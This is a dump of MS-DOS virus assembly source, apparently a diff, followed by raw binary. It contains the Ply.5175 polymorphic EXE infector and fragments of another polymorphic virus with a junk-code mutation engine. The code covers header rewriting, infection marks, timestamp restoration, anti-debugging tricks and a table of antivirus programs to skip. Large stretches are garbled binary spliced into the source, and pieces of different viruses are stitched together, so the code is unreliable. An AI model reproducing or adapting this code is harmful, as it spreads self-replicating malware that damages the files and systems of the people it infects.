@@ -1,0 +1,614 @@
+ Save BX at stack
+	     nop
+	     nop
+	     xchg    ax,bx		 ; BX = header size
+	     nop
+	     nop
+
+	     mov     ax,[di+1ah]	 ; AX = low-order word of filesize
+	     mov     dx,[di+1ch]	 ; DX = high-order word of filesize
+	     push    ax 		 ; Save AX at stack
+	     nop
+	     nop
+	     push    dx 		 ; Save DX at stack
+	     nop
+	     nop
+
+	     sub     ax,bx		 ; Subtract header size from filesize
+	     nop
+	     sbb     dx,00h		 ; Convert to 32-bit
+	     mov     cx,10h
+	     div     cx 		 ; Divide by paragraphs
+	     nop
+	     mov     cx,dx		 ; CX = low-order word of filesize ...
+	     nop
+	     lea     bx,entry_point-100h ; BX = offset of entry_point
+	     add     dx,bx		 ; Add offset of entry_point to low...
+	     nop
+	     mov     [si+14h],dx	 ; Store instruction pointer
+	     mov     [si+16h],ax	 ; Store code segment
+
+	     lea     bx,delta_offset	 ; BX = offset of delta_offset
+	     add     bx,bp		 ; Add delta offset
+	     nop
+	     mov     [bx],cx		 ; Store delta offset
+	     nop
+
+	     inc     ax 		 ; Increase AX
+	     nop
+	     nop
+	     mov     [si+0eh],ax	 ; Store stack segment
+
+	     mov     dx,cx		 ; DX = low-order word of filesize ...
+	     nop
+	     mov     ax,(code_end-code_begin+0c0h)
+	     add     dx,ax		 ; DX = stack pointer
+	     nop
+	     mov     ax,1111111111111110b
+	     and     dx,ax		 ; DX =   "      "
+	     nop
+	     mov     [si+10h],dx	 ; Store stack pointer
+
+	     mov     ax,2020h		 ; AX = infection mark
+	     mov     [si+12h],ax	 ; Store infection mark
+
+	     pop     dx 		 ; Load DX from stack
+	     nop
+	     nop
+	     pop     ax 		 ; Load AX from stack
+	     nop
+	     nop
+	     add     ax,(code_end-code_begin)
+	     adc     dx,00h		 ; Convert to 32-bit
+
+	     mov     cl,09h
+	     nop
+	     push    ax 		 ; Save AX at stack
+	     nop
+	     nop
+	     shr     ax,cl		 ; Multiply by pages
+	     nop
+	     ror     dx,cl		 ;     "    "    "
+	     nop
+	     stc			 ; Set carry flag
+	     nop
+	     nop
+	     adc     dx,ax		 ; DX = total number of 512-bytes p...
+	     nop
+	     pop     ax 		 ; Load AX from stack
+	     nop
+	     nop
+	     and     ah,00000001b
+	     mov     [si+04h],dx	 ; Store totalt number of 512-bytes...
+	     mov     [si+02h],ax	 ; Number of bytes in last 512-byte...
+	     pop     bx 		 ; Load BX from stack
+	     nop
+	     nop
+
+	     mov     ax,4201h		 ; Set current file position (CFP)
+	     mov     cx,-01h
+	     mov     dx,-(code_end-delta_offset)
+	     int     21h
+	     nop
+
+	     mov     ax,(4000h-2020h)	 ; Write to file
+	     add     ax,2020h
+	     mov     cx,02h		 ; Write two bytes
+	     lea     dx,delta_offset	 ; DX = offset of delta_offset
+	     add     dx,bp		 ; Add delta offset
+	     nop
+	     int     21h
+	     nop
+
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     xor     cx,cx		 ; Zero CX
+	     nop
+	     xor     dx,dx		 ; Zero DX
+	     nop
+	     int     21h
+	     nop
+
+	     mov     ax,(4000h-2020h)	 ; Write to file
+	     add     ax,2020h
+	     mov     cx,1ah		 ; Write twenty-six bytes
+	     mov     dx,si		 ; DX = offset of file_header
+	     nop
+	     int     21h
+	     nop
+
+	     mov     ax,(5701h-2020h)	 ; Set file's date and time
+	     add     ax,2020h
+	     mov     cx,[di+16h]	 ; CX = file time
+	     mov     dx,[di+18h]	 ; DX = file date
+	     int     21h
+	     nop
+
+	     mov     ah,3eh		 ; Close file
+	     nop
+	     int     21h
+	     nop
+
+	     mov     ax,(4301h-2020h)	 ; Set file attributes
+	     add     ax,2020h
+	     mov     ch,00h		 ; Zero CH
+	     nop
+	     mov     cl,[di+15h]	 ; CL = file attribute
+	     lea     dx,filename	 ; DX = offset of filename
+	     add     dx,bp		 ; Add delta offset
+	     nop
+	     int     21h
+	     nop
+
+	     jmp     find_next
+virus_exit:
+	     mov     ax,1202h		 ; Get interrupt address
+	     mov     dx,24h		 ; Get interrupt address of interru...
+	     call    int2f_simula
+
+	     mov     ax,cs		 ; AX = code segment
+	     nop
+	     mov     es,ax		 ; ES =  "      "
+	     nop
+
+	     mov     ax,(24h*04h)	 ; AX = offset of interrupt vector 24h
+	     cmp     bx,ax		 ; Debugging?
+	     nop
+	     je      virus_exit_	 ; No debugging? Jump to virus_exit_
+	     nop
+
+	     mov     ax,3500h		 ; Get interrupt vector 00h
+	     int     21h
+	     nop
+
+	     lea     si,int01_off	 ; SI = offset of int01_off
+	     add     si,bp		 ; Add delta offset
+	     nop
+	     lodsw			 ; AX = offset of interrupt 01h
+	     nop
+	     nop
+	     mov     dx,ax		 ; DX =   "    "      "      "
+	     nop
+
+	     mov     ax,es		 ; AX = segment of interrupt 00h
+	     nop
+	     mov     ds,ax		 ; DS =    "    "      "      "
+	     nop
+
+	     mov     ax,(2501h-2020h)	 ; Set interrupt vector 01h
+	     add     ax,2020h
+	     int     21h
+	     nop
+
+	     mov     ax,cs		 ; AX = code segment
+	     nop
+	     mov     ds,ax		 ; DS =  "      "
+	     nop
+	     mov     es,ax		 ; ES =  "      "
+	     nop
+eternal_loop:
+	     jmp     eternal_loop
+	     nop
+virus_exit_:
+	     mov     ah,62h		 ; Get current PSP address
+	     nop
+	     int     21h
+	     nop
+	     mov     es,bx		 ; ES = segment of PSP for current ...
+	     nop
+
+	     mov     cx,bx		 ; CX =    "    "   "   "     "     "
+	     nop
+	     add     cx,10h		 ; CX = segment of beginning of code
+
+	     lea     si,instruct_ptr	 ; SI = offset of instruct_ptr
+	     add     si,bp		 ; Add delta offset
+	     nop
+
+	     add     [si+02h],cx	 ; Add segment of beginning of code...
+	     add     cx,[si+04h]	 ; Add original stack segment to se...
+
+	     cli			 ; Clear interrupt-enable flag
+	     nop
+	     nop
+	     xor     ax,ax		 ; Zero AX
+	     nop
+poly_end:
+	     mov     sp,[si+06h]	 ; SP = stack pointer
+	     mov     ss,cx		 ; SS = stack segment
+	     sti			 ; Set interrupt-enable flag
+
+	     push    ax 		 ; Save AX at stack
+
+	     mov     ds,bx		 ; DS = segment of PSP for current ...
+
+	     db      0eah		 ; JMP imm32 (opcode 0eah)
+instruct_ptr dw      ?			 ; Instruction pointer
+code_seg     dw      ?			 ; Code segment
+
+stack_seg    dw      ?			 ; Stack segment
+stack_ptr    dw      ?			 ; Stack pointer
+
+int24_virus  proc    near		 ; Interrupt 24h of Ply.5175
+	     mov     al,03h		 ; Fail system call in progress
+
+int01_virus  proc    near		 ; Interrupt 01h of Ply.5175
+int2a_virus  proc    near		 ; Interrupt 2ah of Ply.5175
+	     iret			 ; Interrupt return!
+	     endp
+	     endp
+	     endp
+
+int2f_simula proc    near		 ; Simulate interrupt 21h
+	     push    dx 		 ; Load DX from stack
+
+	     pushf
+	     db      9ah		 ; CALL imm32 (opcode 9ah)
+int2f_addr   dd      ?			 ; Address of interrupt 2fh
+
+	     pop     dx 		 ; Load DX from stack
+
+	     ret			 ; Return!
+	     endp
+
+int21_simula proc    near		 ; Simulate interrupt 21h
+	     segcs			 ; Code segment as source segment
+	     int     21h
+	     nop
+
+	     ret			 ; Return!
+	     endp
+
+	     db      00h
+int01_off    dw      ?			 ; Offset of interrupt 01h
+	     db      00h
+entry_point:
+	     jmp     code_begin
+
+file_specifi db      '*.VXE',00h         ; File specification
+file_header  dw      0ah dup(?),00h,0fff0h,?
+	     db      00h
+poly_buffer  db      03h dup(?) 	 ; Polymorphic buffer
+table_begin  db      04h,'AVP.'          ; AntiViral Toolkit Pro
+	     db      08h,'AVPLITE.'      ; AVPLite
+	     db      06h,'AVPVE.'        ; AVP Virus Encyclopedia
+	     db      04h,'BAIT'          ; Bait file
+	     db      06h,'EICAR.'        ; EICAR-ANTIVIRUS-TEST-FILE
+	     db      07h,'EMM386.'       ; Microsoft expanded memory manage...
+	     db      07h,'F-PROT.'       ; F-PROT
+	     db      06h,'FV386.'
+	     db      05h,'FV86.'
+	     db      05h,'MSAV.'         ; Microsoft Anti-Virus
+	     db      09h,'MVTOOL10.'
+	     db      05h,'SCAN.'         ; McAfee ViruScan
+	     db      07h,'TBSCAN.'       ; Thunderbyte virus detector
+	     db      05h,'TBAV.'         ; Thunderbyte menu
+	     db      08h,'TBCHECK.'      ; TbCheck, Resident integrity checker
+	     db      08h,'TBCLEAN.'      ; Thunderbyte clean utility
+	     db      07h,'TBDISK.'       ; TbDisk, Disk guard
+	     db      09h,'TBDRIVER.'     ; TbDriver, TBAV TSR utilities
+	     db      07h,'TBFILE.'       ; TbFile, software guard
+	     db      09h,'TBGENSIG.'     ; TbGenSig, signature file compiler
+	     db      06h,'TBKEY.'        ; TbKey
+	     db      06h,'TBLOG.'        ; TbLog, TBAV automatic log utility
+	     db      06h,'TBMEM.'        ; TbMem, Memory guard
+	     db      08h,'TBSETUP.'      ; Thunderbyte software setup
+	     db      08h,'TBSCANX.'      ; TbScanX resident virus scanner
+	     db      07h,'TBUTIL.'       ; TbUtil
+	     db      09h,'VALIDATE.'     ; VALIDATE
+	     db      08h,'VIRSTOP.'      ; VIRSTOP
+	     db      05h,'VIRUS'         ; Bait file
+	     db      05h,'VPIC.'         ; Picture file viewer
+	     db      06h,'VSAFE.'        ; VSafe
+	     db      00h
+table_end:
+	     db      00h,00h
+_ncdtree     db      '\NCDTREE',00h
+	     db      'PLY'               ; Name of the virus
+poly_blocks  db       (poly_end-poly_begin)/03h dup(90h,90h,04h dup(?))
+code_end:
+dta:
+	     db      15h dup(?) 	 ; Used by DOS for find next-process
+file_attr    db      ?			 ; File attribute
+file_time    dw      ?			 ; File time
+file_date    dw      ?			 ; File date
+filesize     dd      ?			 ; Filesize
+filename     db      0dh dup(?) 	 ; Filename
+data_end:
+
+end	     code_begin
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[PLY_5175.ASM]ÄÄ
+
+         ¤¡<©!    KV2#           ,o¸¡<®    MV       cmp dl,85d¼¡<¯(    OV2#  8#       mpÈ¡<²	    QV    jb Little52
+ Ô¡<µ    SV],0fd89h          Ø¡<¶(    UV2#  8#       p è¡<º	(    WV2#ê  8#         ø¡<¾(    YV2#e  8#         ¡<Â
+(    [V2#b  8#       ], ¡<È	(    ]V2#M  8#       I,0¡<Ì
+(    _V2#P  8#       moD¡<Ñ(    aV2#æ  8#        [T¡<Õ(    cV2#w  8#       LCd¡<Ù    eV     mov bx,offseth¡<Ú	(    gV2#ã  8#       h x¡<Ş    iV  ; SUB BP
+      „¡<á    kVt Paso3           ¡<ä    mVbytes
+        mov˜¡<æ(    oV2#  8#       ut°¡<ì    qVfset Paso1
+      ¸¡<î(    sV2#+  8#         È¡<ò
+(    uV2#(  8#       bxØ¡<ö!    wV2#Ÿ         ],ô¡<ı
+(    yV2#¤  8#       X¡<
+(    {V2#=  8#         ¡<(    }V2#   8#       it<¡<    Vcmp dl,170d
+     D¡<	(    V2#æ  8#       x]d¡<	(    ƒV2#ÿ  8#       BPt¡<(    …V2#E  8#       it˜¡<&(    ‡V2#  8#         ¬¡<+    ‰V,DX
+        jmp s°¡<,(    ‹V2#A  8#       d5¼¡</    V     ; XCHG DX,BPÄ¡<1    Vor ax,ax          Ì¡<3(    ‘V2#g  8#       orà¡<8    “V      in al,40h
+ ä¡<9(    •V2#i  8#         ø¡<>    —Vor
+        ja Sig ¡<@    ™V            ; Must¡<E!    ›V2#            (¡<J    V
+        mov ax,L,¡<K
+(    ŸV2#Ö  8#         <¡<O	(    ¡V2#Ğ  8#         H¡<R    £Varks
+        mov P¡<T(    ¥V2#-  8#       t `¡<X    §V    mov [bx],cx
+h¡<Z    ©Vx,ax              l¡<[
+(    «V2#ï  8#       fr|¡<_    ­V    in al,40h     €¡<`!    ¯V2#£          t ”¡<e!    ±V2#_          x,¤¡<i	(    ³V2#B  8#       gl°¡<l	(    µV2#r  8#         À¡<p(    ·V2#l  8#         Ø¡<v    ¹Ves into memory
+  è¡<z    »V,ax
+        mov bì¡<{    ½V5+2)
+        mov ğ¡<|    ¿V     in al,40h
+  ô¡<}(    ÁV2#´  8#       mb¡<‚(    ÃV2#±  8#       ec¡<…    ÅVer
+        cmp al¡<†    ÇVjb Cambia2
+      (¡<Š    ÉVt Paso4           8¡<    ËV+XX]
+        mov @¡<    ÍV       mov bx,offsH¡<’(    ÏV2#A  8#       81`¡<˜    ÑV    ; ADD SI,XX
+ d¡<™    ÓVoffset Paso6
+    h¡<š(    ÕV2#|  8#         €¡<     ×V/ MOV CX
+        ˜¡<¦    ÙVPaso9
+        mov¼¡<¯    ÛV               ; XÀ¡<°	    İVI]
+        mov bxÌ¡<³    ßV
+        test al,è¡<º    áV          ; Use otğ¡<¼    ãV   jz MasPoly
+   ø¡<¾    åV04646h            ü¡<¿    çV/ INC SI
+        ¡<Ã(    éV2#4  8#       ,0¡<Ç    ëV        ; LODSB / ,¡<Ë(    íV2#1  8#       am8¡<Î    ïVfset Paso4        D¡<Ñ    ñV[BP+XX]
+        mH¡<Ò"    óV2#a          ,oP¡<Ô	"    õV2#c          0c\¡<×	"    ÷V2#e          XXh¡<Ú    ùVbx,offset Paso6
+ l¡<Û    ûV],0b953h          t¡<İ    ıVBX / MOV CX
+     x¡<Ş    ÿVet Paso9
+        €¡<à    Wh                 ˆ¡<â
+    W [BX]
+        mov”¡<å    Wo10
+        mov [œ¡<ç    W             ; INC¤¡<é    	W        jmp AlBuff¬¡<ë    Wv bx,offset Paso4 °¡<ì	    WLEA DI,[BP+XX]
+  ¼¡<ï	    W,0be8dh
+        mÈ¡<ò    Waso5
+        mov Ğ¡<ô    W              ; ADØ¡<ö    W   mov bx,offset Pà¡<ø    Wmov [bx],0b957h   ì¡<û    W; PUSH DI / MOV CXô¡<ı	    Wbx,offset Paso9
+  ¡<     W],03581h          ¡<
+    WORD PTR [DI]
+    ¡<
+    !Wset Paso10
+       ¡<	    #W47h               ,¡<    %WNC DI
+
+
+AlBuffe8¡<	    'Wv cx,200d         D¡<    )WChange opcode ordeP¡<    +W
+        call MuTX¡<    -W          ; named `¡<    /W
+
+        sub dxh¡<
+    1Wov bx,offset Ensuct¡<
+    3W Add random garbag€¡< 	    5Wptor
+Basureo:xor Œ¡<#    7W mov cx,[bx]
+    ˜¡<&
+    9W      inc bx
+    ¤¡<)    ;W       push dx
+  ¬¡<+    =Wbx]
+        call ´¡<-    ?W   pop dx
+       ¼¡</	(    AW2#‘  8#         È¡<2
+    CW   inc dx
+       Ô¡<5    EW      jb Basureo
+Ü¡<7	!    GW2#V            è¡<:	"    IW2#W          
+ô¡<=	"    KW2#Y           d ¡<@#    MW2#[           m¡<B    OW  mov cx,Cripted  ¡<C(    QW2#l  8#               mov si,(offset CopiaVir+Saltarlos)
+        mov di,si                       ; To use the decryptor with any
+        mov bx,di                       ; of the index registers
+        call Desencriptor               ; chosen.
+        ret
+
+
+Ensuciar:                               ; Locations of the decryptor in
+        dw 09,offset Paraguay           ; which we'll insert garbage from
+        dw 04,offset Junk02             ; MontonDeBasura
+        dw 02,offset Junk03
+        dw 06,offset Junk04
+        dw 03,offset Junk05
+        dw 05,offset Junk06
+        dw 02,offset Junk07
+        dw 04,offset Junk08
+        dw 03,offset Junk09
+        dw 07,offset Junk10
+        dw 02,offset Junk11
+        dw 04,offset Junk12
+        dw 08,offset Junk13
+
+
+;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+;! PongoFecha:  Restore victims date, and time with secs=60                  !
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+PongoFecha:
+        mov ax,5701h                    ; Set
+        db 0b9h                         ; mov cx,time
+        Time dw 0                       ; Last modified time
+        and cl,11100000b                ; Set as infected
+        or cl,00011110b                 ; 30*2=60!
+        db 0bah                         ; mov dx,date
+        Date dw 0                       ; Last modified date
+        pushf                           ; Call handler directly
+        call dword ptr cs:[Real21h]
+        ret                             ; And return
+
+        
+;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+;! Sub-Rutine used for pointer moves up to the end                           !
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+AlFinal:mov ax,04202h                   ; To the end
+        xor cx,cx
+        cwd                             ; XOR DX,DX
+        int 21h
+        ret
+
+
+Segmentos:                              ; DS:=CS  &  ES:=CS
+        push cs
+        push cs
+        pop ds
+        pop es
+        ret
+
+
+;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+;! MUTABLA: Exchange the trash opcodes position                              !
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+MuTabla:xor ax,ax
+        in al,40h                       ; Random number from port 40h
+        test al,1                       ; Is it even?
+        jz YaEsPar
+        inc al                          ; If not, make it even
+YaEsPar:mov si,offset MontonDeBasura    ; The table
+        add si,ax                       ; Get a  2 byte-instruction
+        mov dx,[si]                     ; into DX
+        xor ax,ax
+        in al,40h                       ; Another random number
+        test al,1                       ; If not even, make it even
+        jz Alli
+        inc al
+Alli:   mov di,offset MontonDeBasura    ; Garbage 2-byte table
+        add di,ax                       ; Get the instruction
+        mov bx,[di]                     ; into bx
+        mov [si],bx                     ; Exchange its positions
+        mov [di],dx
+        loop MuTabla                    ; CX times
+        ret
+
+
+
+;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+;! YGRAMUL: Chose random junk-instructions and put them into memory          !
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+Ygramul:xor di,di                       ; Garbage intruder
+Otro:   xor ax,ax                       ; Ygramul, the mutant in Endless Story
+        in al,40h                       ; Random number
+        test al,1                       ; Is it even?
+        jz Aqui
+        inc al                          ; Nope, add one
+Aqui:   mov si,offset MontonDeBasura
+        add si,ax                       ; Get the instruction
+  ¥Y‹X şò  ğu4‹D ‹şğ»Ÿİ;ór¹ ó¤°Šà‰Dıä@ˆDÿä@ˆé¿ <ut‹<uŠÄ<ét^<ètX<ëtR$ğ<ptIè¨ ¹ ó¤°éª‹Ç+Æ÷Ø- «°é» İˆ‹Ç+Æ- ‰G‹ş¸ +ø‹ó¹ ó¤ëH<uAŠ<éu4‹D ‹şğ»Ÿİ;ór¹ ó¤°Šà‰Dıä@ˆDÿä@ˆë^Y¸ ğItéÄıëDä@Šàä@‹ø¸+ø;øsø‹Çøøøøø¸Ÿøı°Šà9uÂÃ´/Í!SŒÀPŒÈÀ´ºAÕ‹úÍ!¸$5Í!SŒÀPŒÈÀ¸$%ºgÕÍ!3ÀØ¾¨ ­P­P¸iÅ‰DüŒÈ‰DşŒÈØ¸à-  ¹ ºÕ‹Ú°EˆGë¸à.  Í!sR3ÀÀ\/²Y¿Y  â  ò¿¨ [X«‹Ã«ŒÈÀXØZ¸$%Í!ŒÈØXØZ¸ :-  º€ Í!ŒÈØéÂ°VˆGW¾£õ¿_ı‹Ş¬< t%´ ‹ÈÙCWó¦_t‹óë×_é^ÿ_¾…õ¸ =º_ÕÍ!‹Ø´?‹Ö¹ Í!´>Í!¸mz-  9t†à9téÿ¸  9Dtõ¸á"  3Éº_ÕÍ!¸â  º_ÕÍ!‹Ø¸B3É3ÒÍ!¸à  ¹Aº ÕÍ!‹D±ÓàS“‹E‹UPR+ÃƒÚ ¹ ÷ñ‹Ê»|Ó‰T‰D»İ‰@‰D‹Ñ¸Ğ¸şÿ#Ğ‰T¸  ‰DZXAƒÒ ±	PÓèÓÊùĞX€ä‰T‰D[¸B¹ÿÿºÀëÍ!¸à  ¹ ºÕÍ!¸ B3É3ÒÍ!¸à  ¹ ‹ÖÍ!¸á6  ‹M‹UÍ!´>KX²Y%  D÷  œ++D6  œ++DŸ  œ++         ; ¢X
+ D
+        xchg al,al                      ; 86 C0
+        xchg bl,bl                      ; 86 DB
+        xchg cl,cl                      ; 86 C9
+      ¿Y¸X
+™ Ô  ‹ Í!¸á"  µ ŠMº_ÕÍ!éáı¸º$ èr ŒÈÀ¸ ;Øt.¸ 5Í!¾yõ­‹ĞŒÀØ¸á  Í!ŒÈØÀëş´bÍ!Ã‹ËƒÁ¾_õLLú3À‹dÑûPÛê ch,ch ¾X                  ; 86 ED
+        xchg dh,dh                      ; 86 F6
+        cld                             ; FB
+        int 03h                         ; CC
+        nop                             ; 90
+        nop                             ; 90
+        pushf                           ; 9C
+        popf                            ; 9˜X¹X _   h ¸XºX a     ¹X»X c   6ºX¼X e   s »XÜX g   °ÏRœš     ; 07
+ ßX    inc ax                          ; 40
+        dec ax                          ; 48
+        inc bx                          ; 43
+        dec bx                          ; 4B
+        inc cx                          ; 41
+        dec cx                          ; 49
+        inc dx                          ; 42
+        dec dx                          ; 4A
+        std                             ; FD
+        cld                             ; FC
+        stc          ¼XİX m     ÜXıX q   ZÃ.Í!Ã            Y              ; F8
+        jmp short $+2                   ; EB 00
+        jc $+2                          ; 72 00
+        jnc $+2                         ; 73 00
+        jz $+2                          ; 74 00
+        jnz $+2                         ; 75 00
+        jpo $+2                         ; 7B 00
+        jpe $+2                         ; 7A 00
+        jno $+2                         ; 71 00
+        jg $+2                          ; 7F 00
+        js $+2  İXşX y     ıXY {  
+  éù*.VXE  or ax,a#Y                      ; 0B C0
+        or bx,bx                        ; 0B DB
+        or cx,cx                        ; 0B C9
+        or dx,dx                        ; 0B D2
+        or si,si                        ; 09 F6
+        or di,di                        ; 09 FF
+        or bp,bp                        ; 09 ED
+        or ah,ah                        ; 08 E4
+        or al,al                        ; 08 C0
+        or bh,bh                        ; 08 FF
+     şX!Y …  l  Y Y   
+                       YAY ™     ğÿ              CY ; 08 ED
+        or cl,cl                        ; 08 C9
+        or dh,dh                        ; 08 F6
+        or dl,dl                        ; 08 D2
+        and ax,ax                       ; 23 C0
+        and bx,bx                       ; 23 DB
+        and cx,cx                       ; 23 C9
+        and dx,dx                       ; 23 D2
+        and si,si                       ; 21 F6
+        and di,di                       ; 21 FF
+        and bp,bp         !YBY    ; AYbY Ÿ    avY h,ah                       ; 20 E4
+        and al,al                       ; 20 C0
+        and bh,bh                        µD0 FF
+        and bl,bl                       ; 20 DB
+        and ch,ch                       ; 20 ED
+        and cl,cl                       ; 20 C9
+        and dh,dh                       ; 20 F6
+        and dl,dl                       ; 20 D2
+        mov ax,ax                       ; 89 C0
+        mov bx,bx                       ; 89 DB
+        mov cx,BYeY      dYdY       ;                dxbY…Y
+£  ü AVP.AVPLITE.AVPVE.BAITEICAR.EMM386.F-PROT.FV386.FV86.MSAV.	MVTOOL10.SCAN.TBSCAN.TBAV.TBCHECK.TBCLEAN.TBDISK.	TBDRIVER.TBFILE.	TBGENSIG.TBKEY.TBLOG.TBMEM.TBSETUP.TBSCANX.TBUTIL.	VALIDATE.VIRSTOP.VIRUSVPIC.VSAFE.   \NCDTREE PLY     ;Y E4
+        mov al,al                       ; 88 C0
+        mov bh,bh                       ; 88 FF
+        mov bl,bl                       ; 88 DB
+        mov ch,ch                       ; 88 ED
+        mov cl,cl                   eYŒY Ÿ  9‡Y‰Y      d        ˆY       ‡Y‰Y      ˆY      dl‹Y‹Y                        
+ …YY A   aYY                        
+ŒYY V   ,bY‘Y W     Y’Y Y   3‘Y“Y [   x,’Y   _    •Y•Y       ;                ax +  Á   œ++            ;     0ı+[ 
+ D4  œ++DF  œ++Dy  œ++D  œ++D—  œ++D  œ++Dô  œ++D6  œ++D½  œ++ ; 3B«Y 
+        cmp ax,bp                       ; 3B C5
+        cmp bx,ax                       ; 3B D8
+        cı+KXR 
+ D  œ++Dz  œ++DÀ  œ++D.  œ++D^  œ++D‚  œ++D   œ++D¾  œ++3B D9
+       ·Y  bx,dx                       ; 3B DA
+        cmp bx,si                       ; 3B DE
+        cmp bx,di    ‹XkXI 
+ D7  œ++D=  œ++Dv  œ++D  œ++DÇ  œ++DÖ  œ++D*  œ++DD
+   ÂY  cmp cx,ax                       ; 3B C8
+        cmp cx,bx                       ; 3B CB
+        cmp cx,cx                kX˜X% 
+ Dä  œ++D  œ++DD  œ++           BZ
+     ; 3B CA
+        cmp cx,si                       ; 3B CE
+        cmp cx,di                       ; 3B CF
+        cmp cx,bp                       ; 3B CD
+        cmp dx,ax                       ; 3B D0
+        cmp dx,bx                       ; 3B D3
+        cmp dx,cx                       ; 3B D1
+        cmp dx,dx                       ; 3B D2
+        cmp dx,si                       ; 3B D6
+        cmp dx,di                       ; 3B D7
+        cmp dx,bp                       ; 3B D5
+        cmp si,ax                       ; 3B F0
+        cmp si,bx                       ; 3B F3
+        cmp si,cx                       ; 3B F1
+        cmp si,dx                       ; 3B F2
+        cmp si,si                       ; 3B F6
+        cmp si,di                       ; 3B F7
+        cmp si,bp                       ; 3B F5
+        cmp di,ax                       ; 3B F8
+        cmp di,bx                       ; 3B FB
+        cmp di,cx                       ; 3B F9
+        cmp di,dx                       ; 3B FA
+        cmp di,si                       ; 3B FE
+        cmp di,di                       ; 3B FF
+        cmp di,bp                       ; 3B FD
+        cmp bp,ax                       ; 3B E8
+        cmp bp,bx                       ; 3B EB
+        cmp bp,cx                       ; 3B E9
+        cmp bp,dx                       ; 3B EA
+        cmp bp,si                       ; 3B EE
+        cmp bp,di                       ; 3B EF
+        cmp bp,bp                       ; 3B ED
+
+
+Omega:                                  ; End of virus on the file
+HeavyMetal   dw 0                       ; Heavy Metal even in RAM ;)
+Vsuck        db 0                       ; Vsafe's flags
+HacerStealth db 1                       ; Flag to make or not the stealth
+Handle       dw 0                       ; File's key
+Atributos    db 0                       ; File's attribs
+Vieja24h     dd 0                       ; 24h's old handler
+CopiaVir     db Largor dup('P')         ; Here will go the encryp  ¾CPLY_5175.ASM1ˆ    Turbo Assembler  Version 4.1™ˆ @é¥-S"PLY_5175.ASM³ˆ @éL–  hˆ @¡”– _TEXTCODE–˜ Hl’– _DATADATAÂ˜ H  – DGROUP‹š ÿÿYˆ @¢‘ æ ½ ŒÈØÀ¸ +èûü¸  ¾!.ğ¿5.øâİÍ/¸à   º“ÕÍ!3ÀØ¾¼ ¿mı¹ ó¤ŒÈØ¸º$ è
+ŒÈÀ¸ ;Øt(¸á  èû¿yı‰ŒÈÀ¸á  ºiÕèİ¾…õ¿_ı‹D«‹D«‹D«‹D«¾õ¹ä@Šàä@2Ä$QV< uFŠ<t:ŠD<u1‹» İ‰G<ët
+$ğ<puşO°ˆ‹ş‹ó¹ ó¤éÇ<u=Š<u1‹D» İ‰<ët
+$ğ<puşG°ˆG‹ş‹ó¹ ó¤é…<u|‹<uŠÄ<étg<èta<ët[<ÃtU$ğ<ptL<PtFèb¹ ó¤°Ãªä@ªä@ª°è» İˆ‹Ç+Æ- ‰G‹ş¸ +ø‹ó¹ ó¤é<u@Š<èu4‹D ‹şğ»Ÿİ;ór¹ ó¤°Šà‰Dıä@ˆDÿä@ˆé¿ <ut‹<uŠÄ<ét^<ètX<ëtR$ğ<ptIè¨ ¹ ó¤°éª‹Ç+Æ÷Ø- «°é» İˆ‹Ç+Æ- ‰G‹ş¸ +ø‹ó¹ ó¤ëH<uAŠ<éu4‹D ‹şğ»Ÿİ;ór¹ ó¤°Šà‰Dıä@ˆDÿä@ˆë^Y¸ ğItéÄıëDä@Šàä@‹ø¸+ø;øsø‹Çøøøøø¸Ÿøı°Šà9uÂÃ´/Í!SŒÀPŒÈÀ´ºAÕ‹úÍ!¸$5Í!SŒÀPŒÈÀ¸$%ºgÕÍ!3ÀØ¾¨ ­P­P¸iÅ‰DüŒÈ‰DşŒÈØ¸à-  ¹ ºÕ‹Ú°EˆGë¸à.  Í!sR3ÀÀ@œ[ Ä»Ä4ÄFÄyÄÄ—ÄÄôÅ6Å½ÆÆzÆÀÇ.Ç^Ç‚Ç Ç¾Ÿ â¿¨ [X«‹Ã«ŒÈÀXØZ¸$%Í!ŒÈØXØZ¸ :-  º€ Í!ŒÈØéÂ°VˆGW¾£õ¿_ı‹Ş¬< t%´ ‹ÈÙCWó¦_t‹óë×_é^ÿ_¾…õ¸ =º_ÕÍ!‹Ø´?‹Ö¹ Í!´>Í!¸mz-  9t†à9téÿ¸  9Dtõ¸á"  3Éº_ÕÍ!¸â  º_ÕÍ!‹Ø¸B3É3ÒÍ!¸à  ¹Aº ÕÍ!‹D±ÓàS“‹E‹UPR+ÃƒÚ ¹ ÷ñ‹Ê»|Ó‰T‰D»İ‰@‰D‹Ñ¸Ğ¸şÿ#Ğ‰T¸  ‰DZXAƒÒ ±	PÓèÓÊùĞX€ä‰T‰D[¸B¹ÿÿºÀëÍ!¸à  ¹ ºÕÍ!¸ B3É3ÒÍ!¸à  ¹ ‹ÖÍ!¸á6  ‹M‹UÍ!´>Í!¸á" ë<IBM  4.0  à @ğ	             )Ó03BRIAN      FAT12   ú¡L £Ó|¡N £Õ| n¢½}¡H£±Óà-À£N £& ÇL ‚|Ç$ b}¾ |‰÷À¹ üó¥Í€üªuÏ€üuEƒùu@€ş u;PSVWœ.ÿÓ|së6&¿şUªtë'&€¿¼Étzè‹ è1 ‰Ş€úyw